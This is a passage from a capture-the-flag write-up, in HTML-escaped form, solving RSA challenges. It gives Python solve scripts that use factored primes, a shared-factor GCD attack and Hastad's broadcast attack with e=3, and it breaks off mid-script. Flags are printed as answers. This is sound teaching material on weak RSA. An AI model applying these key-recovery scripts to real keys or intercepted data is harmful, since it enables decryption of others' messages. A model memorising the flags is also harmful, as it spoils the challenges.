&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;Crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;Util&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;*
&lt;&#x2F;span&gt;&lt;span&gt;n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;546014635841741214724882952304387823741798461149589549073179989118942746109940806878269775538274570065946589413677004071487344751464649121103982272835006900203922112014630898761428602513684456008956735791010937229939856259403186940249737579526542460562078728957198932156520780835942292131829398548678970431263462917223085165930683353518778015361505451889259321493813123084031407195410778661720394898118828299025325200597986154170392835072784810370185329392356423340408483449291280713796374297147668615988522804223480631576577707073715128342533703842150980913675658012799681575774731843549389349977365287936534707998476564357339504431638612839358093914282814270477657856345062084136585402704930924062452984009716927826681976269057923158930326380110735873715506666086031427627450725825495228912040943784627278987497908133546573083543604901933763330940965980882566819970423354937076331119777415405707162588442490342746115310986462330781467571631209829523895479737199963129517613642920935109776495829400236613168913129178658637967592913193540283532220304664924612246117951571439486418122093867454452618997458068515332016877486822805232899716524040444751997121936138984564834862354469295078855441829018404782747219665338778379471257704041
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;e &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;65537
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;497483520135207500611760341868934810216889295862727367409205471739457798733223813938415492642898622071289502771394670201759355356873731071744923938304067196827981196823596976532284031567818944043351160692892539254848854527943095670705184836531463778923699513154523281624336593518751911469590777921172775020125081803529411082078530404614569485860638460689961289946436553586222781503048987585305336865777424252321433817251942278548031598867440246798562662298880488044382840476214732326114298681849826143159014132251265975612736174765852107701466877003101250308950535660691651846052082123375934624356694170453897672257371991315676787548733520567289929667876604682273501711766130944645562650989837328685043543330211830184365436596077862055649246517141787872170320358968622818470064395975654949073402489903952399985907827496667385839890041608685588908200009780210043116940593521695695047783434230143405184690206691002634954008353327872663055826018481013718627348218684688250775372760462829705754318024652361552668830110066219305953343851243676904796434142570868419087560131333056695456062994781034014322792678534785191950145702468201676105282230660132801024614625267740668507168119879074770666830923799616054485447308126877109671082189614
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#from factordb
&lt;&#x2F;span&gt;&lt;span&gt;p &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;23354146979807319379999035616961227366315140956417473671454187034894451162291754802462941941792796900830979379875976598091266482784685424013905480696388873312112449447015212036533336920764065285748033710474328055812364692120325949818178301777905279103958955246642416286153474237338739835798119305508201074075918506331902107847659951627678483765213310235851319160745426496852724170929530989982548624157909773262752522594414435161921211944019434983046703898010646693649668494220236993757035493132421299985405030215783112721654976457363937286689672094963265015048673356916456174809392166143308820305157390154213277022361
&lt;&#x2F;span&gt;&lt;span&gt;q &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;23379772179812068808174060753537744579203831235837216258047345717791206838844783973094148970269358352883567686183840162453475135997997950171025172534250066839781721720291637394109275750765747393807129441718738564581300844549866075387635571271298099970059805382997224172143494300775742278526976057440901844970233807992493192827375594281731619879000721912671268883932814086571959959837609600236134071446484378655039534937911808777812990351810838102078057859303673209338100518315299313874836179635779981742550281014611235035038725280128727341135995530457136512443488805309366834219571741391932893715725604175334445964881
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;phi &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(p&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;(q&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;d &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;phi)
&lt;&#x2F;span&gt;&lt;span&gt;m &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;n)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;long_to_bytes&lt;&#x2F;span&gt;&lt;span&gt;(m))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# byuctf{rsa_is_only_secure_when_p_and_q_are_unknown}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : byuctf{rsa_is_only_secure_when_p_and_q_are_unknown}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;rsa-3drop-of-blood&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#rsa-3drop-of-blood&quot; aria-label=&quot;Anchor link for: rsa-3drop-of-blood&quot;&gt;RSA-3ü©∏&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;n1 = 26936730986023789726214222876998431579035871765812234385674097050592112272540329063679602773116293498245937781951160051718036177035087801218359133356523071700951108999020905116034905584806261203518345118128714311038590925635180342040347317022008233631809623824589107373210514331169745651687793393307158179191306187356408951648269495142386375021669218752561961647301029204701333026044435685936341126368602940601101599988477874713569476970068734357580527463645209944448988010693985476127837819331701523891965427561798033127731232916390511986369304971158889254173850566560028528340860519614489276904182246324437302697433
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;e1 = 65537
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;c1 = 25934221721388531303090294836956821212346696995428676440185777623629033147440636130540319272854260855117016879903925227836710795492438220977864741830686432435183222727791461378988782191893620213711460265022633971293289987925875691438890670054518553696690583070284033592035281829227897938832962322172505881421894428362134145126751766514249801481330619906708370005958557827981820321861133293595400304305721764486699677941331024345924352161482159664366018182446127343098427579677894070842066840562853624060861183697917208697602208453017595582242281467105778066369782229287834403074433848470534633158573935584429007575715
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;n2 = 20923351960149847207730448386993771286287991808293298691185156471519720793292179321382926775933281826329369963004005667653815105072159583791658532166606431385861980687037872135521884790087813454844716254644626942821490878728677736261700329782075809716063515721266692286574071240561529911159730824490258866613280873755548760004314650585913096197607936750263556276920577987540676841745347308103070523989154846358123142014592046611945781700690640990848003152423310523158983857208127158850925297742214928064334410930947749935069628731105093722212442331657106356911123912454871778728334875010902513275561639806401894881233
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;e2 = 65537
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;c2 = 5993773597007465934515223705550947500391213737662065644971977783446564890828050443747162704068048188331597029929182281837445674583301936037963788912954366180921337518251139032904603786774772009913305609053718347365864177247549192649908207240197602397010006677485658506955283638199651692990436006544549785434255965098715363287267470252318128158357490592521797199393154974403123099999366644663048724011101287811844340320520544010179529188112211115440469084617438296961494801221969674213288489675624156545941630517075958425681203711654677553772595530799489102830165490202523397154229276688719481530893488434863906070343
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Dropped the first blü©∏ü©∏d for this challenge.&lt;&#x2F;p&gt;
&lt;p&gt;The given n1,n2 are sharing a common factor.&lt;&#x2F;p&gt;
&lt;p&gt;GCD(n1,n2) != 1&lt;&#x2F;p&gt;
&lt;p&gt;This means the crypto system is prone to &lt;code&gt;common factor attack&lt;&#x2F;code&gt;. Finding the common factor will leads to the solution.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;Crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;Util&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;*
&lt;&#x2F;span&gt;&lt;span&gt;n1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;26936730986023789726214222876998431579035871765812234385674097050592112272540329063679602773116293498245937781951160051718036177035087801218359133356523071700951108999020905116034905584806261203518345118128714311038590925635180342040347317022008233631809623824589107373210514331169745651687793393307158179191306187356408951648269495142386375021669218752561961647301029204701333026044435685936341126368602940601101599988477874713569476970068734357580527463645209944448988010693985476127837819331701523891965427561798033127731232916390511986369304971158889254173850566560028528340860519614489276904182246324437302697433
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;e1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;65537
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;c1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;25934221721388531303090294836956821212346696995428676440185777623629033147440636130540319272854260855117016879903925227836710795492438220977864741830686432435183222727791461378988782191893620213711460265022633971293289987925875691438890670054518553696690583070284033592035281829227897938832962322172505881421894428362134145126751766514249801481330619906708370005958557827981820321861133293595400304305721764486699677941331024345924352161482159664366018182446127343098427579677894070842066840562853624060861183697917208697602208453017595582242281467105778066369782229287834403074433848470534633158573935584429007575715
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;n2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;20923351960149847207730448386993771286287991808293298691185156471519720793292179321382926775933281826329369963004005667653815105072159583791658532166606431385861980687037872135521884790087813454844716254644626942821490878728677736261700329782075809716063515721266692286574071240561529911159730824490258866613280873755548760004314650585913096197607936750263556276920577987540676841745347308103070523989154846358123142014592046611945781700690640990848003152423310523158983857208127158850925297742214928064334410930947749935069628731105093722212442331657106356911123912454871778728334875010902513275561639806401894881233
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;e2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;65537
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;c2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;5993773597007465934515223705550947500391213737662065644971977783446564890828050443747162704068048188331597029929182281837445674583301936037963788912954366180921337518251139032904603786774772009913305609053718347365864177247549192649908207240197602397010006677485658506955283638199651692990436006544549785434255965098715363287267470252318128158357490592521797199393154974403123099999366644663048724011101287811844340320520544010179529188112211115440469084617438296961494801221969674213288489675624156545941630517075958425681203711654677553772595530799489102830165490202523397154229276688719481530893488434863906070343
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;p1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;GCD&lt;&#x2F;span&gt;&lt;span&gt;(n1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;n2) &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# common factor
&lt;&#x2F;span&gt;&lt;span&gt;q1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;n1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;p1
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;phi &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(p1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;(q1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;d1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(e1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;phi)
&lt;&#x2F;span&gt;&lt;span&gt;m1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(c1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;d1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;n1)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;long_to_bytes&lt;&#x2F;span&gt;&lt;span&gt;(m1))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# byuctf{coprime_means_factoring_N_becomes_much_easier}byuctf{too_smol}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : byuctf{coprime_means_factoring_N_becomes_much_easier}byuctf{too_smol}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;rsa-4-drop-of-blood&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#rsa-4-drop-of-blood&quot; aria-label=&quot;Anchor link for: rsa-4-drop-of-blood&quot;&gt;RSA-4 ü©∏&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;n1 = 25204912957894049536633029588071532883154221495361435745558539407530325536509218257991893451902442183954212400671502526830623527340613723328379300388737939211263541814108106183164630301938900862986688763583982133846507136234797325243547177627054271161715200611591594812723672399437505379398941496184886411879923583394041753902383846644013849190900416111230521180435101859101110596828380586449182686175177638441549656137307050392520754146511496313215137339773851458160180450925216541537448515297981124184019831730808991821344392915274230294654187421183676471212265322367890189804699510021526923237231850244056681024361
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;e1 = 3
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;c1 = 8177192204481601898705460379101384591996531766013815643642297541939314169289538943467463950155787562006058743758523755363825964609610993939021120980839831173842134605117089923025444468026164578567348718360392736482132312367435114106411271743218631041094275894508404221506482038656928803775293360599721583316194630449469869000491476753827928793659938654925187969087524783314008405767753004191090522037968098548258698350055999105058915648497702724525585509
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;================================================
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;n2 = 17730912385401458370516374144454354828481353051514329263921774569034415114147424203611660978860008058118764431105602401970281692066419254457694301039461623568501484102567802483628476717695013320444442267232019104240173401975387173805390636521671252624249730700497552226732834062715286458634274525026438931671208367178653031967364951679420066768732647183187381700016195545187024094717207787859217993871236368911145957298126589666514319408022801341248744002320245345234912423717815146532293315342644702101415345900126397475592837306256140915525455824350305349773210334856093169535686115299159772550674315375987529523179
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;e2 = 3
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;c2 = 8177192204481601898705460379101384591996531766013815643642297541939314169289538943467463950155787562006058743758523755363825964609610993939021120980839831173842134605117089923025444468026164578567348718360392736482132312367435114106411271743218631041094275894508404221506482038656928803775293360599721583316194630449469869000491476753827928793659938654925187969087524783314008405767753004191090522037968098548258698350055999105058915648497702724525585509
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;================================================
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;n3 = 23693871552180460990138635073805949225912252125308334418081834697641804631104724668330415198785050388969117484647897131795893896100932121531733121069301557203541651575306855376180158639595396645851251320756224273151350168394783274111111375428683335001923152182758469432988805562827169898721409159172411067426322303967736140645806651181720610635139163613355013365367013643617931710120446074129630384181873406149243284193113399417540744056880787819360491511062694356302764642727497777585348003477373456680752873785829149551421840290660162776229985812994060664107888011786183808824620497078292008444842754064007647832261
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;e3 = 3
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;c3 = 8177192204481601898705460379101384591996531766013815643642297541939314169289538943467463950155787562006058743758523755363825964609610993939021120980839831173842134605117089923025444468026164578567348718360392736482132312367435114106411271743218631041094275894508404221506482038656928803775293360599721583316194630449469869000491476753827928793659938654925187969087524783314008405767753004191090522037968098548258698350055999105058915648497702724525585509
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Observations:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;e is very small (3)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;same message was encrypted with different modulus(n1,n2,n3)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;n1,n2,n3 are coprimes&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;So, &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Coppersmith%27s_attack#H%C3%A5stad&#x27;s_broadcast_attack&quot; target=_blank&gt;Hastad&#x27;s broadcast attack&lt;&#x2F;a&gt; applies when an identical message is sent out &amp;gt;= e times.
Using the Chinese Remainder Theorem, the plaintext message can be recovered.&lt;&#x2F;p&gt;
&lt;p&gt;Here is the solv.py&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;Crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;Util&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;*
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;n1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;25204912957894049536633029588071532883154221495361435745558539407530325536509218257991893451902442183954212400671502526830623527340613723328379300388737939211263541814108106183164630301938900862986688763583982133846507136234797325243547177627054271161715200611591594812723672399437505379398941496184886411879923583394041753902383846644013849190900416111230521180435101859101110596828380586449182686175177638441549656137307050392520754146511496313215137339773851458160180450925216541537448515297981124184019831730808991821344392915274230294654187421183676471212265322367890189804699510021526923237231850244056681024361
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;e1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;c1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8177192204481601898705460379101384591996531766013815643642297541939314169289538943467463950155787562006058743758523755363825964609610993939021120980839831173842134605117089923025444468026164578567348718360392736482132312367435114106411271743218631041094275894508404221506482038656928803775293360599721583316194630449469869000491476753827928793659938654925187969087524783314008405767753004191090522037968098548258698350055999105058915648497702724525585509
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;n2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;17730912385401458370516374144454354828481353051514329263921774569034415114147424203611660978860008058118764431105602401970281692066419254457694301039461623568501484102567802483628476717695013320444442267232019104240173401975387173805390636521671252624249730700497552226732834062715286458634274525026438931671208367178653031967364951679420066768732647183187381700016195545187024094717207787859217993871236368911145957298126589666514319408022801341248744002320245345234912423717815146532293315342644702101415345900126397475592837306256140915525455824350305349773210334856093169535686115299159772550674315375987529523179
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;e2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;c2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8177192204481601898705460379101384591996531766013815643642297541939314169289538943467463950155787562006058743758523755363825964609610993939021120980839831173842134605117089923025444468026164578567348718360392736482132312367435114106411271743218631041094275894508404221506482038656928803775293360599721583316194630449469869000491476753827928793659938654925187969087524783314008405767753004191090522037968098548258698350055999105058915648497702724525585509
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;n3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;23693871552180460990138635073805949225912252125308334418081834697641804631104724668330415198785050388969117484647897131795893896100932121531733121069301557203541651575306855376180158639595396645851251320756224273151350168394783274111111375428683335001923152182758469432988805562827169898721409159172411067426322303967736140645806651181720610635139163613355013365367013643617931710120446074129630384181873406149243284193113399417540744056880787819360491511062694356302764642727497777585348003477373456680752873785829149551421840290660162776229985812994060664107888011786183808824620497078292008444842754064007647832261
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;e3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;c3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8177192204481601898705460379101384591996531766013815643642297541939314169289538943467463950155787562006058743758523755363825964609610993939021120980839831173842134605117089923025444468026164578567348718360392736482132312367435114106411271743218631041094275894508404221506482038656928803775293360599721583316194630449469869000491476753827928793659938654925187969087524783314008405767753004191090522037968098548258698350055999105058915648497702724525585509
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# gcd(n1,n2) = gcd(n1,n3) = gcd(n2,n3) = 1
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#therefore the CRT works here
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;N &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;n1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;n2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;n3
